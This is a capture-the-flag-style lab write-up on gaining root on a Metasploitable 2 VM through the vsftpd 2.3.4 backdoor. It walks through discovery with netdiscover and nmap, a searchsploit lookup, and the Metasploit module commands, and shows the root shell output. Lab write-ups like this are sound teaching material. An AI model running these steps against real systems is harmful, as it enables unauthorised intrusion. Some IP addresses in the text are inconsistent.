# Metasploitable 2 FTP exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - FTP.



 > The target of this lab is use vulnerablitity in FTP service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

21/tcp   open  ftp         vsftpd 2.3.4
.
.
.
```

Now to see some vulnerablities in FTP port, we use `searchspolit vsftpd 2.3.4`

```
.
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                  | unix/remote/17491.rb
```

Now we use metasploit to exploit this vulnerablity.

`sudo msfdb init && msfconsole`



`msf6 > search vsftpd 2.3.4`


```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

## 3- Exploit

Now as we find exploit on metasploit, so we use this exploit to gain root access.

`msf6 > use 0`

For setting of exploit;

 `msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options`

In options we see Remote Host is not set, so use `set RHOST 192.168.43.95`, to set remote host.

Before final step, we need to set payload. 
`show payloads`.
 
 There is only one payload, so just simply use that.



 Now with all set, just hit `run`


 ```
[*] 192.168.43.95:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.43.95:21 - USER: 331 Please specify the password.
[+] 192.168.43.95:21 - Backdoor service has been spawned, handling...
[+] 192.168.43.95:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.43.132:34129 -> 192.168.43.95:6200) at 2024-06-28 13:52:50 -0400

id
uid=0(root) gid=0(root)
whoami
root
```

 

> That was just a speed-run!